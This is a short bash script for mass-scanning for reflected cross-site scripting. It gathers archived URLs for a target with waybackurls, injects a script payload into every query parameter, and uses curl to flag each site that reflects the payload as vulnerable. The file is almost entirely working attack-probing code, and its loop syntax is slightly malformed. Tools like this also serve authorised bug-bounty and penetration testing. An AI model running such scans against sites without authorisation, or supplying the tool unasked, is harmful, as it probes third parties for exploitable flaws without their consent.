#!/bin/bash

url_flag=''
list_flag=''

print_usage() {
  printf "Usage: \n -u url (e.g. https://example.com) \n -l list (e.g. urls.txt)"
}

no_args="true"
while getopts 'u:l:h' flag; do
  case "${flag}" in
    u) url_flag="${OPTARG}" ;;
    l) list_flag="${OPTARG}" ;;
    h) print_usage ;;
    *) print_usage 
       exit 1 ;;
  esac
  no_args="false"
done

if [ "$no_args" == "true"  ]
then
   print_usage
   exit;
fi


if [ ! -z "$url_flag" ]
then
   echo "$url_flag" > xscript-temp-urls-to-check.txt
elif [ ! -z "$list_flag" ]
then
   cat "$list_flag" > xscript-temp-urls-to-check.txt
fi;


cat xscript-temp-urls-to-check.txt | waybackurls \
| tee xscript-temp.txt \
| grep "=" \
| egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" \
| qsreplace '"><script>confirm (1)</script>' > xscript-temp-combinedfuzz.json \
&& cat xscript-temp-combinedfuzz.json \
| while read host do ; \
do curl --silent --path-as-is --insecure "$host" \
| grep -qs "<script>confirm (1)" \
&& echo -e "$host \033[0;31mVulnerable\033[0m\n"; done

rm xscript-temp.txt xscript-temp-combinedfuzz.json xscript-temp-urls-to-check.txt

exit;
